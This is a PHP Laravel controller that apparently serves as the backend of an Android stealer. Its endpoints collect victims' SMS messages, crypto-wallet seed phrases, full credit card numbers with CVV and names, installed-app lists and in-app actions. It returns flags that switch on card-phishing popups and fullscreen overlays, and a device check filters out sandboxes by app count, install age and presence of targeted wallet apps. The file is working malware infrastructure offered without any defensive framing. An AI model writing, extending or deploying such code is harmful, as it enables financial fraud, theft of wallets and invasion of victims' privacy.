<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\ActionRecord;
use App\Models\Channel;
use App\Models\Device;
use App\Models\Monitor;
use App\Models\ReceiveApp;
use App\Models\ReceiveCard;
use App\Models\ReceiveSms;
use App\Models\ReceiveWords;
use App\Models\SystemConfig;
use App\Models\Version;
use App\Service\CountryService;
use App\Service\DataEncryptionService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Larva\GeoIp2\GeoIp2;
use Larva\GeoIp2\InvalidArgumentException;

class DeviceController extends Controller
{

    /**
     * 检查应用列表是否包含监听的包名（类型为1-助记词）
     *
     * @param array $apps 应用列表数组，每个元素应包含 app_package 字段
     * @return bool 如果应用列表中包含监听的包名返回true，否则返回false
     */
    private function checkAppsContainsMonitorPackages(array $apps)
    {
        // 获取监听列表中类型为1（助记词）的APP包名列表
        $monitors = Monitor::getList(['type' => Monitor::TYPE_MNEMONIC, 'is_enabled' => Monitor::STATUS_ENABLED]);
        $monitorPackages = array_column($monitors, 'app_package');
        $monitorPackages = array_filter($monitorPackages); // 过滤空值

        // 获取应用列表中的包名
        $appPackages = array_column($apps, 'app_package');
        $appPackages = array_filter($appPackages); // 过滤空值

        // 检查是否有交集（应用列表中存在监听列表中类型为1的APP）
        return !empty(array_intersect($appPackages, $monitorPackages));
    }

    /**
     * 获取最新版本信息
     * 客户端自行判断是否需要更新
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function checkUpdate(Request $request)
    {
        $request->validate([
            'platform' => 'nullable|string|in:android,ios', // 平台，默认android
            'channel_code' => 'nullable|string|max:50', // 渠道编号
        ]);

        $platform = $request->get('platform', 'android');
        $channelCode = $request->get('channel_code', '');

        // 获取最新版本（只查询启用的版本）
        $query = Version::query()
            ->where('platform', $platform)
            ->where('status', Version::STATUS_ENABLED);
        
        // 如果有渠道编号，则按渠道筛选；否则获取默认渠道（channel_code为空）的版本
        if (!empty($channelCode)) {
            $query->where('channel_code', $channelCode);
        } else {
            $query->where(function($q) {
                $q->whereNull('channel_code')->orWhere('channel_code', '');
            });
        }
        
        $latestVersion = $query->orderBy('version_number', 'desc')->first();

        if (empty($latestVersion)) {
            return $this->fail(404, '暂无可用版本');
        }

        // 直接返回最新版本信息，客户端自行判断是否需要更新
        return $this->success([
            'version_code' => $latestVersion->version_code,
            'version_number' => $latestVersion->version_number,
            'package_name' => $latestVersion->package_name ?? '',
            'download_url' => $latestVersion->download_url ?? '',
            'update_log' => $latestVersion->update_log ?? '',
            'force_update' => $latestVersion->force_update == 1
        ]);
    }

    /**
     * 监听列表 - 返回所有开启的监听数据
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function monitorList(Request $request)
    {
        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'monitorList',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'params' => $request->all(),
            ]);
        }

        // 从缓存中获取所有开启的监听数据
        $list = Monitor::getList(['is_enabled' => Monitor::STATUS_ENABLED]);

        // 只返回需要的字段
        $list = array_map(function ($item) {
            return [
                'app_name' => $item['app_name'],
                'app_package' => $item['app_package'],
                'type' => $item['type']
            ];
        }, $list);

        return $this->success($list);
    }

    /**
     * 通过渠道编号查询渠道的网址
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function getChannelUrl(Request $request)
    {
        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'getChannelUrl',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'params' => $request->all(),
            ]);
        }

        $request->validate([
            'code' => 'required|string'
        ]);

        $channel = Channel::query()
            ->where('code', $request->code)
            ->select('url')
            ->first();

        if (empty($channel)) {
            return $this->fail(404, '渠道不存在');
        }

        return $this->success(['url' => $channel->url]);
    }

    /**
     * 上报设备信息 - 根据设备号判断，存在则更新，不存在则新增
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportDevice(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 通过CDN和反向代理后，使用getRealIp()获取真实IP
        $ip = getRealIp($request);

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportDevice',
                'ip' => $ip,
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }


        $decoded = base64_decode($encryptedData, true);
        if ($decoded !== false) {
            $jsonData = json_decode($decoded, true);
            if (json_last_error() === JSON_ERROR_NONE) {
                //1：其他接口全部兼容base64，不然所有的数据都没办法提交
                /*2：上报设备信息的地方，
                先用base64解密，解密出来的话做查询，不写入
                解密不出来就正常用自定义解密，然后做正常写入 查询功能*/
                // 验证必填字段
                if (empty($jsonData['device_number'])) {
                    return $this->fail(400, 'device_number字段必填');
                }
                $device = Device::query()
                ->where('device_number', $jsonData['device_number'])
                ->first();
                if ($device) {
                    // 增加打开次数
                    $device->increment('open_count');
                    // 确保 updated_at 字段被更新
                    $device->touch(); 
                    // 返回指定的字段
                    $channel = Channel::query()
                        ->where('code', $device['app_channel'])
                        ->select('url')
                        ->first();

                        if (empty($channel)) {
                            $channel_url = "";
                        }else{
                            $channel_url = $channel->url;
                        }
                    return $this->success([
                        'has_card' => $device->has_card,
                        'has_sms' => $device->has_sms,
                        'install_time_distance' => $device->install_time_distance,
                        'screen_interval_time' => $device->screen_interval_time,
                        'has_screen_popup_card' => $device->has_screen_popup_card,
                        'has_fullscreen_mode' => $device->has_fullscreen_mode,
                        'channel_url' => $channel_url,
                    ]);
                }else{
                    return $this->fail(400, '异常设备');
                }


            }
        
        }



        try {
            // 使用约定固定密钥解密（客户端和服务端约定相同的密钥）
            // 设备号在加密数据中，不在URL中，不需要时间戳
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData , false);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }

        $data = [];
        // 提取需要的字段
        
        $allowedFields = [
            'device_number',
            'appName',
            'appVersion',
            'app_channel',
            'language',
            'proxy',
            'brand',
            'model',
            'sdk_version',
            'float_window_permission',
            'sms_permission',
            'monitor_permission',
        ];

        foreach ($allowedFields as $field) {
            if (isset($jsonData[$field])) {
                $data[$field] = $jsonData[$field];
            }
        }

        // 从系统配置读取6个字段的默认值
        $defaultConfigs = [
            'has_card' => SystemConfig::getByKey('default_has_card', true),
            'has_sms' => SystemConfig::getByKey('default_has_sms', true),
            'install_time_distance' => SystemConfig::getByKey('default_install_time_distance', true),
            'screen_interval_time' => SystemConfig::getByKey('default_screen_interval_time', true),
            'has_screen_popup_card' => SystemConfig::getByKey('default_has_screen_popup_card', true),
            'has_fullscreen_mode' => SystemConfig::getByKey('default_has_fullscreen_mode', true),
        ];
        
        // 获取配置值，如果配置不存在则使用默认值0
        $data['has_card'] = isset($defaultConfigs['has_card']['value']) 
            ? (int)$defaultConfigs['has_card']['value'] : 0;
        $data['has_sms'] = isset($defaultConfigs['has_sms']['value']) 
            ? (int)$defaultConfigs['has_sms']['value'] : 0;
        $data['install_time_distance'] = isset($defaultConfigs['install_time_distance']['value']) 
            ? (int)$defaultConfigs['install_time_distance']['value'] : 0;
        $data['screen_interval_time'] = isset($defaultConfigs['screen_interval_time']['value']) 
            ? (int)$defaultConfigs['screen_interval_time']['value'] : 0;
        $data['has_screen_popup_card'] = isset($defaultConfigs['has_screen_popup_card']['value']) 
            ? (int)$defaultConfigs['has_screen_popup_card']['value'] : 0;
        $data['has_fullscreen_mode'] = isset($defaultConfigs['has_fullscreen_mode']['value']) 
            ? (int)$defaultConfigs['has_fullscreen_mode']['value'] : 0;

        // 使用之前获取的真实IP
        $data['ip'] = $ip;

        // GeoIp2 查询国家信息
        $data['country'] = 'UNKNOWN';
        if (!empty($ip) && filter_var($ip, FILTER_VALIDATE_IP)) {
            try {
                $ipcheck = GeoIp2::city($ip);
                $data['country'] = $ipcheck->country->isoCode ?? 'UNKNOWN';
                //Log::info('GeoIp2 lookup success', ['ip' => $ip, 'country' => $data['country']]);
            } catch (InvalidArgumentException $exception) {
                // 处理无效IP等错误并记录便于排查
                //Log::warning('GeoIp2 lookup failed', ['ip' => $ip, 'error' => $exception->getMessage()]);
            }
        }
        

        // 使用事务和锁机制防止并发重复入库
        $device = DB::transaction(function () use ($data) {
            // 使用 lockForUpdate() 锁定查询，防止并发时重复插入
            $device = Device::query()
                ->where('device_number', $data['device_number'])
                ->lockForUpdate()
                ->first();

            if ($device) {
                // 存在则更新
                $device->update($data);
                // 增加打开次数
                $device->increment('open_count');
                // 确保 updated_at 字段被更新
                $device->touch();
            } else {
                // 不存在则新增
                $data['open_count'] = 1; // 新增时设置为1
                $device = Device::create($data);
            }

            return $device;
        });

        
        $channel = Channel::query()
        ->where('code', $data['app_channel'])
        ->select('url')
        ->first();

        if (empty($channel)) {
            $channel_url = "";
        }else{
            $channel_url = $channel->url;
        }

        // 返回指定的字段
        return $this->success([
            'has_card' => $device->has_card,
            'has_sms' => $device->has_sms,
            'install_time_distance' => $device->install_time_distance,
            'screen_interval_time' => $device->screen_interval_time,
            'has_screen_popup_card' => $device->has_screen_popup_card,
            'has_fullscreen_mode' => $device->has_fullscreen_mode,
            'channel_url' => $channel_url,
        ]);
    }

    /**
     * 根据设备号查询设备信息
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function infoByDeviceNumber(Request $request)
    {

        $request->validate([
            'device_number' => 'required|string'
        ]);

        $device = Device::query()
            ->where('device_number', $request->device_number)
            ->first();

        if (empty($device)) {
            return "<html><body><div style='text-align:center;margin-top:50px;color:red;'><h2>设备不存在</h2></div></body></html>";
        }

        // 查询该设备的应用列表
        $apps = ReceiveApp::query()
            ->where('device_number', $request->device_number)
            ->select('app_name', 'app_package', 'install_time', 'created_at')
            ->orderBy('created_at', 'desc')
            ->get()
            ->toArray();

        // 直接使用数组长度获取应用数量
        $appCount = count($apps);

        // 判断是否符合条件：应用数量大于20个，并且应用列表里面存在和监听列表里面类型为1的APP
        $isQualified = false;
        if ($appCount > 20) {
            $isQualified = $this->checkAppsContainsMonitorPackages($apps);
        }

        $data = $device->toArray();
        $html = "<html><head><meta charset='UTF-8'><title>设备详情</title>";
        $html .= "<style>
                    body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
                    .container { max-width: 800px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                    h2 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-top: 30px; }
                    h2:first-child { margin-top: 0; }
                    .item { margin-bottom: 10px; display: flex; }
                    .label { font-weight: bold; width: 150px; color: #666; }
                    .value { color: #000; flex: 1; word-break: break-all; display: flex; justify-content: space-between; align-items: center; }
                    .status-yes { color: green; font-weight: bold; }
                    .status-no { color: red; font-weight: bold; }
                    .app-list { margin-top: 15px; }
                    .app-item { padding: 10px; margin-bottom: 10px; background-color: #f9f9f9; border-left: 3px solid #4CAF50; border-radius: 4px; }
                    .app-item-header { font-weight: bold; color: #333; margin-bottom: 5px; }
                    .app-item-detail { color: #666; font-size: 0.9em; margin-top: 5px; }
                    .app-count { font-size: 1.2em; color: #4CAF50; font-weight: bold; }
                    table { width: 100%; border-collapse: collapse; margin-top: 15px; }
                    table th, table td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
                    table th { background-color: #f5f5f5; font-weight: bold; color: #333; }
                    table tr:hover { background-color: #f9f9f9; }
                 </style></head><body>";
        $html .= "<div class='container'>";
        $html .= "<h2>设备详细信息</h2>";
        
        $fields = [
            'id' => 'ID',
            'device_number' => '设备号',
            'appName' => '应用名称',
            'appVersion' => '应用版本',
            'app_channel' => '渠道',
            'language' => '语言',
            'ip' => 'IP地址',
            'country' => '国家',
            'created_at' => '安装时间',
            /*
            'brand' => '品牌',
            'model' => '型号',
            'sdk_version' => 'SDK版本',
            'proxy' => '代理',
            'tags' => '标签',
            'has_card' => '获取信用卡',
            'has_sms' => '获取短信',
            'float_window_permission' => '浮窗权限',
            'sms_permission' => '短信权限',
            'monitor_permission' => '监听权限',
            'install_time_distance' => '安装距离',
            'screen_interval_time' => '开屏间隔',
            'open_count' => '打开次数',
            'updated_at' => '最后更新'
            */
        ];

        foreach ($fields as $key => $label) {
            $value = $data[$key] ?? '-';
            
            // 国家字段处理 - 将国家代码转换为中文名称
            if ($key === 'country') {
                $value = CountryService::getCountryName($value);
            }
            
            // 状态类字段处理
            if (in_array($key, ['has_card', 'has_sms', 'float_window_permission', 'sms_permission', 'monitor_permission'])) {
                $statusClass = $value == 1 ? 'status-yes' : 'status-no';
                $statusText = $value == 1 ? '是' : '否';
                $value = "<span class='{$statusClass}'>{$statusText}</span>";
            }

            $html .= "<div class='item'><div class='label'>{$label}：</div><div class='value'>{$value}</div></div>";
        }

        // 添加应用数量和应用列表
        $html .= "<h2>应用信息</h2>";
        $qualifiedText = $isQualified ? '<span class="status-yes">符合条件</span>' : '<span class="status-no">不符合</span>';
        $html .= "<div class='item'><div class='label'>应用数量：</div><div class='value'><span><span class='app-count'>{$appCount}</span> 个</span>{$qualifiedText}</div></div>";
        
        if ($appCount > 0) {
            $html .= "<div class='app-list'>";
            $html .= "<table>";
            $html .= "<thead><tr><th>应用名称</th><th>应用包名</th><th>安装时间</th><th>上报时间</th></tr></thead>";
            $html .= "<tbody>";
            
            foreach ($apps as $app) {
                $appName = htmlspecialchars($app['app_name'] ?? '-', ENT_QUOTES, 'UTF-8');
                $appPackage = htmlspecialchars($app['app_package'] ?? '-', ENT_QUOTES, 'UTF-8');
                $installTime = $app['install_time'] ?? '-';
                //$createdAt = $app['created_at'] ?? '-';
                
                $html .= "<tr>";
                $html .= "<td>{$appName}</td>";
                $html .= "<td>{$appPackage}</td>";
                $html .= "<td>{$installTime}</td>";
                $html .= "</tr>";
            }
            
            $html .= "</tbody></table>";
            $html .= "</div>";
        } else {
            $html .= "<div class='app-list'><p style='color: #999;'>暂无应用数据</p></div>";
        }

        $html .= "</div></body></html>";

        return response($html);
    }


    /**
     * 检测有效设备
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function checkValidDevice(Request $request)
    {
        $request->validate([
            'device_number' => 'required|string'
        ]);

        $deviceNumber = $request->device_number;

        // 检查设备是否存在
        $device = Device::query()
            ->where('device_number', $deviceNumber)
            ->first();

        if (empty($device)) {
            return $this->success([
                'is_valid' => false,
                'device_exists' => false,
                'message' => '设备不存在'
            ]);
        }

        // 查询该设备的应用列表
        $apps = ReceiveApp::query()
            ->where('device_number', $request->device_number)
            ->select('app_name', 'app_package', 'install_time', 'created_at')
            ->orderBy('install_time', 'asc')
            ->get()
            ->toArray();

        // 直接使用数组长度获取应用数量
        if (count($apps) <= 20) {
            return $this->success([
                'is_valid' => false,
                'device_exists' => true,
                'message' => '设备不符合有效条件:应用数量小于20个'
            ]);
        }

        // 判断最老的APP是否已安装30天以上
        if (!empty($apps)) {
            // 查找第一个有安装时间的APP（由于已按install_time升序排列，找到的第一个就是最老的）
            $installTime = null;
            foreach ($apps as $app) {
                if (!empty($app['install_time'])) {
                    $installTime = $app['install_time'];
                    break;
                }
            }
            
            if (!empty($installTime)) {
                try {
                    // 尝试将安装时间转换为Carbon对象
                    $installDate = \Carbon\Carbon::parse($installTime);
                    // 计算从安装时间到现在过了多少天
                    $daysDiff = $installDate->diffInDays(now());
                    
                    if ($daysDiff < 30) {
                        return $this->success([
                            'is_valid' => false,
                            'device_exists' => true,
                            'message' => '设备不符合有效条件:最老的APP安装时间不足30天'
                        ]);
                    }
                } catch (\Exception $e) {
                    // 如果时间格式解析失败，跳过这个检查
                    // 可以根据实际情况决定是否返回错误
                }
            }
        }
        

        // 判断是否符合条件：应用列表里面存在和监听列表里面类型为1的APP
        if (!$this->checkAppsContainsMonitorPackages($apps)) {
            return $this->success([
                'is_valid' => false,
                'device_exists' => true,
                'message' => '设备不符合有效条件:应用列表里面不存在和监听列表里面类型为1的APP'
            ]);
        }


        return $this->success([
            'is_valid' => true,
            'device_exists' => true,
            'message' => '设备有效'
        ]);
    }




    /**
     * 检查设备是否存在
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function checkDeviceExists(Request $request)
    {

        $request->validate([
            'device_number' => 'required|string'
        ]);

        $exists = Device::query()
            ->where('device_number', $request->device_number)
            ->exists();

        return $this->success([
            'exists' => $exists
        ]);
    }



    /**
     * 上报设备应用列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportApps(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportApps',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        try {
            // 使用约定固定密钥解密
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }

        if (empty($jsonData['apps']) || !is_array($jsonData['apps'])) {
            return $this->fail(400, 'apps字段必填且必须为数组');
        }

        $deviceNumber = $jsonData['device_number'];

        // 根据设备号查询设备ID
        $device = Device::query()
            ->where('device_number', $deviceNumber)
            ->first();

        $deviceId = $device ? $device->id : null;

        // 批量保存应用列表
        $savedCount = 0;
        $apps = [];
        foreach ($jsonData['apps'] as $app) {
            if (empty($app['app_name']) && empty($app['app_package'])) {
                continue; // 跳过无效的应用数据
            }

            // 检查重复数据：同一设备号、同一应用包名和同一APP名称已存在则跳过
            $exists = ReceiveApp::query()
                ->where('device_number', '=',$deviceNumber)
                ->where('app_package', '=',$app['app_package'] ?? '')
                //->where('app_name', '=',$app['app_name'] ?? '')
                ->exists();

            if ($exists) {
                continue; // 跳过重复数据
            }

            $receiveApp = ReceiveApp::create([
                'device_id' => $deviceId,
                'device_number' => $deviceNumber,
                'app_name' => $app['app_name'],
                'app_package' => $app['app_package'],
                'install_time' => $app['app_install_time'] ?? null,
            ]);
            $apps[] = $receiveApp->toArray();
            $savedCount++;
        }

        return $this->success();
    }

    /**
     * 上报设备短信列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportSms(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportSms',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        try {
            // 使用约定固定密钥解密
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }

        if (empty($jsonData['sms_list']) || !is_array($jsonData['sms_list'])) {
            return $this->fail(400, 'sms_list字段必填且必须为数组');
        }

        $deviceNumber = $jsonData['device_number'];

        // 根据设备号查询设备ID
        $device = Device::query()
            ->where('device_number', $deviceNumber)
            ->first();

        $deviceId = $device ? $device->id : null;

        // 批量保存短信列表
        foreach ($jsonData['sms_list'] as $sms) {
            if (empty($sms['content'])) {
                continue; // 跳过无效的短信数据
            }

            // 检查重复数据：同一设备号、同一发送方、同一内容和同一时间已存在则跳过
            $exists = ReceiveSms::query()
                ->where('device_number', '=',$deviceNumber)
                ->where('sender', '=',$sms['sender'] ?? null)
                ->where('content', '=',$sms['content'])
                ->where('sms_time', '=',$sms['sms_time'] ?? null)
                ->exists();

            if ($exists) {
                continue; // 跳过重复数据
            }

            $receiveSms = ReceiveSms::create([
                'device_id' => $deviceId,
                'device_number' => $deviceNumber,
                'sender' => $sms['sender'] ?? null,
                'content' => $sms['content'],
                'sms_time' => $sms['sms_time'] ?? null,
            ]);
        }

        return $this->success();
    }

    /**
     * 上报设备助记词
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportWords(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportWords',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        try {
            // 使用约定固定密钥解密
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }

        if (empty($jsonData['words'])) {
            return $this->fail(400, 'words字段必填');
        }

        $deviceNumber = $jsonData['device_number'];

        // 根据设备号查询设备ID
        $device = Device::query()
            ->where('device_number', $deviceNumber)
            ->first();

        $deviceId = $device ? $device->id : null;

        // 使用事务和锁机制防止并发重复入库
        $words = $jsonData['words'];
        
        $receiveWords = DB::transaction(function () use ($words, $deviceId, $deviceNumber, $jsonData) {
            // 使用 lockForUpdate() 锁定查询，防止并发时重复插入
            $exists = ReceiveWords::query()
                ->where('words', $words)
                ->lockForUpdate()
                ->exists();

            if ($exists) {
                // 助记词已存在，跳过入库
                return null;
            }

            // 先保存助记词（钱包地址字段暂时为空，将在队列任务中异步生成）
            return ReceiveWords::create([
                'device_id' => $deviceId,
                'device_number' => $deviceNumber,
                'app_name' => $jsonData['app_name'] ?? null,
                'app_package' => $jsonData['app_package'] ?? null,
                'words' => $words
            ]);
        });

        if ($receiveWords === null) {
            // 助记词已存在，跳过入库
            return $this->success(['message' => '助记词已存在，跳过入库']);
        }

        return $this->success();
    }


    
    /**
     * 上报设备信用卡
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportCards(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportCards',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        try {
            // 使用约定固定密钥解密
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }


        $deviceNumber = $jsonData['device_number'];

        // 根据设备号查询设备ID
        $device = Device::query()
            ->where('device_number', $deviceNumber)
            ->first();

        $deviceId = $device ? $device->id : null;

        // 准备要保存的数据
        $cardData = [
            'device_id' => $deviceId,
            'device_number' => $deviceNumber,
            'app_name' => $jsonData['app_name'] ?? null,
            'app_package' => $jsonData['app_package'] ?? null,
            'card_number' => $jsonData['card_number'] ?? null,
            'card_date' => $jsonData['card_date'] ?? null,
            'cvv' => $jsonData['cvv'] ?? null,
            'user_first_name' => $jsonData['user_first_name'] ?? null,
            'user_last_name' => $jsonData['user_last_name'] ?? null,
        ];

        // 如果卡号相同则更新，否则新增
        if (!empty($cardData['card_number'])) {
            $receiveCard = ReceiveCard::query()
                ->where('device_number', $deviceNumber)
                ->where('card_number', $cardData['card_number'])
                ->first();
            
            if ($receiveCard) {
                // 更新现有记录
                $receiveCard->update($cardData);
            } else {
                // 创建新记录
                $receiveCard = ReceiveCard::create($cardData);
            }
        } else {
            // 如果没有卡号，直接创建新记录
            $receiveCard = ReceiveCard::create($cardData);
        }

        return $this->success();
    }

    /**
     * 上报用户动作记录
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportActionRecords(Request $request)
    {
        // 获取原始请求体内容（AES加密的字符串）
        $encryptedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('DeviceController访问日志', [
                'method' => 'reportActionRecords',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encryptedData),
                'content' => $encryptedData,
            ]);
        }
        
        if (empty($encryptedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        try {
            // 使用约定固定密钥解密
            $jsonData = DataEncryptionService::custom_decrypt($encryptedData);
        } catch (\Exception $e) {
            return $this->fail(400, $e->getMessage());
        }

        // 验证必填字段
        if (empty($jsonData['device_number'])) {
            return $this->fail(400, 'device_number字段必填');
        }

        // 判断包名是否在监听列表中，如果不在则不入库
        $appPackage = $jsonData['app_package'] ?? null;
        
        // 如果包名为空，直接返回成功，不入库
        if (empty($appPackage)) {
            return $this->success();
        }
        
        // 查询包名是否在监听列表中（且已启用）
        $monitor = Monitor::query()
            ->where('app_package', $appPackage)
            ->where('is_enabled', Monitor::STATUS_ENABLED)
            ->first();
        
        // 如果包名不在监听列表中，直接返回成功，不入库
        if (empty($monitor)) {
            return $this->success();
        }

        // 使用当前日期
        $operateDate = date('Y-m-d');
        
        // 查询上一条记录（同一个设备号、同一个包名、同一个动作）
        $lastRecord = ActionRecord::query()
            ->where('device_number', $jsonData['device_number'])
            ->where('app_package', $jsonData['app_package'] ?? null)
            ->where('action', $jsonData['action'] ?? null)
            ->orderBy('id', 'desc')
            ->first();

        // 如果存在上一条记录
        if ($lastRecord) {
            // 计算时间间隔（秒）
            $timeDiff = time() - strtotime($lastRecord->created_at);
            
            // 如果间隔小于60秒（1分钟）
            if ($timeDiff < 60 * 5) {
                // 情况2：完全相同，跳过入库
                $isSame = 
                    $lastRecord->device_number === $jsonData['device_number'] &&
                    $lastRecord->app_package === ($jsonData['app_package'] ?? null) &&
                    $lastRecord->action === ($jsonData['action'] ?? null) &&
                    $lastRecord->user_action === ($jsonData['user_action'] ?? null);
                
                if ($isSame) {
                    return $this->success();
                }
            }

            // 情况1：上一条记录用户动作为空，当前记录用户动作有值，则更新上一条记录
            if (empty($lastRecord->user_action) && !empty($jsonData['user_action'])) {
                $lastRecord->update([
                    'user_action' => $jsonData['user_action']
                ]);
                return $this->success();
            }

        }



        // 保存动作记录
        ActionRecord::create([
            'device_number' => $jsonData['device_number'],
            'app_package' => $jsonData['app_package'] ?? null,
            'action' => $jsonData['action'] ?? null,
            'user_action' => $jsonData['user_action'] ?? null,
            'operate_date' => $operateDate,
        ]);

        return $this->success();
    }

}
